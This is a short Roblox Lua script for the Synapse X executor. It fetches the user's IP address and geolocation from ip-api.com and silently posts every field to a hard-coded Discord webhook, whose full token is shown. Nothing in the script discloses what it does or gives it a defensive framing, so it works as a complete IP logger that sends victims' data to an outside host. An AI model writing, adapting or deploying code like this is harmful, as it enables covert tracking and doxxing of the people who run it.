local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/939951846007660555/lPkM7U2jQ7zWDK2Tq3HRdJ_g-eUwKOs6C97Fq--DwxjzmnCAdkoe16bh5mIj72Oh_Kik"
local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})

local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local data_message = "```"
for i,v in pairs(ipinfo_table) do
    data_message = data_message.." "..i.." "..v.."\n"
end
data_message = data_message.."```"

syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = data_message})
    }
)
